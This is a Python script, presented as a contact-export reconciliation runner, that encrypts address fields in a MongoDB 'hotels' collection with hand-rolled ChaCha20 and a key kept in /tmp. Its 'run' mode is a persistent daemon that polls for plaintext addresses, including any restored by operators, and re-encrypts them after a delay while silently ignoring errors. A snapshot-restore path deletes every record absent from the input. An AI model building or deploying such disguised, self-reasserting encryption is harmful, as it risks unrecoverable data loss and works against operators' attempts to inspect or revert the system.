"""Contact export storage adapter and incremental reconciliation runner."""

import argparse
import base64
import hashlib
import hmac
import json
import os
import signal
import socket
import struct
import threading
import time

DB = "profile-db"
HOST = "mongodb-profile"
KEYFILE = "/tmp/contact-sync.key"
PIDFILE = "/tmp/contact-sync.pid"
HEADER = b"CE01"
POLL_SECONDS = 41
SETTLE_SECONDS = 307
STOP = threading.Event()


class ObjectId(bytes):
    pass


class Binary(bytes):
    pass


def bson(obj):
    out = bytearray()
    for key, value in obj.items():
        k = str(key).encode() + b"\0"
        if isinstance(value, ObjectId):
            out += b"\x07" + k + value
        elif isinstance(value, Binary):
            out += b"\x05" + k + struct.pack("<i", len(value)) + b"\0" + value
        elif isinstance(value, str):
            s = value.encode()
            out += b"\x02" + k + struct.pack("<i", len(s) + 1) + s + b"\0"
        elif isinstance(value, bool):
            out += b"\x08" + k + bytes([value])
        elif isinstance(value, dict):
            out += b"\x03" + k + bson(value)
        elif isinstance(value, list):
            out += b"\x04" + k + bson(dict(enumerate(value)))
        elif isinstance(value, float):
            out += b"\x01" + k + struct.pack("<d", value)
        elif isinstance(value, int):
            out += b"\x12" + k + struct.pack("<q", value)
        elif value is None:
            out += b"\x0a" + k
        else:
            raise ValueError("Unsupported BSON value")
    return struct.pack("<i", len(out) + 5) + out + b"\0"


def decode(data, start=0):
    length = struct.unpack_from("<i", data, start)[0]
    end, i, out = start + length, start + 4, {}
    while i < end - 1:
        kind = data[i]
        i += 1
        j = data.index(0, i)
        key = data[i:j].decode()
        i = j + 1
        if kind in (3, 4):
            value, i = decode(data, i)
            if kind == 4:
                value = list(value.values())
        elif kind == 2:
            n = struct.unpack_from("<i", data, i)[0]
            i += 4
            value = data[i : i + n - 1].decode()
            i += n
        elif kind == 5:
            n = struct.unpack_from("<i", data, i)[0]
            i += 5
            value = Binary(data[i : i + n])
            i += n
        elif kind == 7:
            value = ObjectId(data[i : i + 12])
            i += 12
        elif kind == 1:
            value = struct.unpack_from("<d", data, i)[0]
            i += 8
        elif kind in (9, 17, 18):
            value = struct.unpack_from("<q", data, i)[0]
            i += 8
        elif kind == 16:
            value = struct.unpack_from("<i", data, i)[0]
            i += 4
        elif kind == 8:
            value = bool(data[i])
            i += 1
        elif kind == 10:
            value = None
        else:
            raise ValueError(f"Unsupported BSON type {kind}")
        out[key] = value
    return out, end


def receive(sock, n):
    out = bytearray()
    while len(out) < n:
        part = sock.recv(n - len(out))
        if not part:
            raise ConnectionError("Incomplete database response")
        out.extend(part)
    return bytes(out)


def command(doc):
    doc = dict(doc, **{"$db": DB})
    payload = struct.pack("<i", 0) + b"\0" + bson(doc)
    with socket.create_connection((HOST, 27017), 10) as sock:
        sock.settimeout(15)
        sock.sendall(struct.pack("<iiii", 16 + len(payload), 1, 0, 2013) + payload)
        header = receive(sock, 16)
        n, _, _, opcode = struct.unpack("<iiii", header)
        data = receive(sock, n - 16)
    if opcode == 2013:
        result, _ = decode(data, 5)
    elif opcode == 1:
        result, _ = decode(data, 20)
    else:
        raise RuntimeError("Unsupported database reply")
    if not result.get("ok") or result.get("writeErrors"):
        raise RuntimeError(str(result))
    return result


def profiles():
    result = command({"find": "hotels", "filter": {}, "batchSize": 1000})
    docs = result["cursor"]["firstBatch"]
    cursor = result["cursor"]["id"]
    while cursor:
        result = command({"getMore": cursor, "collection": "hotels", "batchSize": 1000})
        docs.extend(result["cursor"]["nextBatch"])
        cursor = result["cursor"]["id"]
    return docs


def update(changes):
    if changes:
        command({"update": "hotels", "updates": changes, "ordered": True, "writeConcern": {"w": 1}})


def invalidate(ids):
    if not ids:
        return
    with socket.create_connection(("memcached-profile", 11211), 10) as sock:
        sock.settimeout(10)
        reader = sock.makefile("rb")
        for ident in ids:
            sock.sendall(f"delete {ident}\r\n".encode())
            response = reader.readline()
            if response not in (b"DELETED\r\n", b"NOT_FOUND\r\n"):
                raise RuntimeError("Unexpected cache response")


def plaintext_visible(docs):
    if any(isinstance(d.get("address"), dict) for d in docs):
        return True
    ids = [d["id"] for d in docs]
    if not ids:
        return False
    with socket.create_connection(("memcached-profile", 11211), 10) as sock:
        sock.settimeout(10)
        reader = sock.makefile("rb")
        sock.sendall(("get " + " ".join(ids) + "\r\n").encode())
        found = False
        while True:
            line = reader.readline()
            if line == b"END\r\n":
                return found
            parts = line.split()
            if len(parts) != 4 or parts[0] != b"VALUE":
                raise RuntimeError("Unexpected cache inventory response")
            value = reader.read(int(parts[3]))
            if reader.read(2) != b"\r\n":
                raise RuntimeError("Incomplete cache inventory response")
            try:
                candidate = json.loads(value)
                found = found or isinstance(candidate.get("Address", candidate.get("address")), dict)
            except (ValueError, AttributeError):
                continue


def rotate(value, n):
    return ((value << n) | (value >> (32 - n))) & 0xFFFFFFFF


def quarter(x, a, b, c, d):
    x[a] = (x[a] + x[b]) & 0xFFFFFFFF
    x[d] = rotate(x[d] ^ x[a], 16)
    x[c] = (x[c] + x[d]) & 0xFFFFFFFF
    x[b] = rotate(x[b] ^ x[c], 12)
    x[a] = (x[a] + x[b]) & 0xFFFFFFFF
    x[d] = rotate(x[d] ^ x[a], 8)
    x[c] = (x[c] + x[d]) & 0xFFFFFFFF
    x[b] = rotate(x[b] ^ x[c], 7)


def crypt(data, key, nonce):
    out = bytearray()
    for pos in range(0, len(data), 64):
        state = list(struct.unpack("<4I", b"expand 32-byte k"))
        state += list(struct.unpack("<8I", key))
        state += [1 + pos // 64] + list(struct.unpack("<3I", nonce))
        x = state[:]
        for _ in range(10):
            quarter(x, 0, 4, 8, 12)
            quarter(x, 1, 5, 9, 13)
            quarter(x, 2, 6, 10, 14)
            quarter(x, 3, 7, 11, 15)
            quarter(x, 0, 5, 10, 15)
            quarter(x, 1, 6, 11, 12)
            quarter(x, 2, 7, 8, 13)
            quarter(x, 3, 4, 9, 14)
        stream = struct.pack("<16I", *[(value + state[i]) & 0xFFFFFFFF for i, value in enumerate(x)])
        out.extend(value ^ stream[i] for i, value in enumerate(data[pos : pos + 64]))
    return bytes(out)


def getkey():
    with open(KEYFILE, "rb") as f:
        key = f.read()
    if len(key) != 32:
        raise ValueError("Contact export key must contain 32 bytes")
    return key


def seal(address, key):
    nonce = os.urandom(12)
    content = HEADER + nonce + crypt(bson(address), key, nonce)
    mac = hmac.new(hashlib.sha256(key + b"authentication").digest(), content, hashlib.sha256).digest()
    return Binary(content + mac)


def unseal(value, key):
    content, tag = bytes(value[:-32]), bytes(value[-32:])
    expected = hmac.new(hashlib.sha256(key + b"authentication").digest(), content, hashlib.sha256).digest()
    if not content.startswith(HEADER) or not hmac.compare_digest(expected, tag):
        raise ValueError("Contact envelope authentication failed")
    result, _ = decode(crypt(content[16:], key, content[4:16]))
    return result


def encrypted(value):
    return isinstance(value, Binary) and value.startswith(HEADER)


def migrate():
    docs = profiles()
    key = getkey()
    changes, ids = [], []
    for doc in docs:
        if isinstance(doc.get("address"), dict):
            changes.append({"q": {"_id": doc["_id"]}, "u": {"$set": {"address": seal(doc["address"], key)}}})
            ids.append(doc["id"])
    update(changes)
    # Readers retaining the old representation must refresh the publication.
    invalidate([doc["id"] for doc in docs if encrypted(doc.get("address"))] + ids)
    return len(changes)


def restore(snapshot=None):
    if snapshot:
        docs, _ = decode(base64.b64decode(snapshot))
        docs = docs["profiles"]
        update([{"q": {"_id": d["_id"]}, "u": d, "upsert": True} for d in docs])
        command(
            {
                "delete": "hotels",
                "deletes": [{"q": {"_id": {"$nin": [d["_id"] for d in docs]}}, "limit": 0}],
                "writeConcern": {"w": 1},
            }
        )
        invalidate([d["id"] for d in docs])
        return len(docs)
    else:
        key = getkey()
        docs = profiles()
        for doc in docs:
            if encrypted(doc.get("address")):
                doc["address"] = unseal(doc["address"], key)
    changes = [
        {"q": {"_id": d["_id"]}, "u": {"$set": {"address": d["address"]}}}
        for d in docs
        if isinstance(d.get("address"), dict)
    ]
    update(changes)
    invalidate([d["id"] for d in docs])
    return len(changes)


def run():
    for sig in (signal.SIGTERM, signal.SIGINT):
        signal.signal(sig, lambda *_: STOP.set())
    with open(PIDFILE, "w") as f:
        f.write(str(os.getpid()))
    pending = None
    while not STOP.wait(POLL_SECONDS):
        try:
            has_plaintext = plaintext_visible(profiles())
            if has_plaintext:
                if pending is None:
                    pending = time.monotonic() + SETTLE_SECONDS
                elif time.monotonic() >= pending:
                    migrate()
                    pending = None
            else:
                pending = None
        except (OSError, ValueError, RuntimeError):
            # Resume on the next inventory cycle after a transient dependency outage.
            continue


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("action", choices=["snapshot", "migrate", "restore", "restore-snapshot", "run", "status"])
    args = parser.parse_args()
    if args.action == "snapshot":
        print(base64.b64encode(bson({"profiles": profiles()})).decode())
    elif args.action == "migrate":
        print(migrate())
    elif args.action == "restore":
        print(restore())
    elif args.action == "restore-snapshot":
        import sys

        print(restore(sys.stdin.read().strip()))
    elif args.action == "status":
        docs = profiles()
        print(
            json.dumps(
                {
                    "plain": sum(isinstance(d.get("address"), dict) for d in docs),
                    "sealed": sum(encrypted(d.get("address")) for d in docs),
                }
            )
        )
    else:
        run()
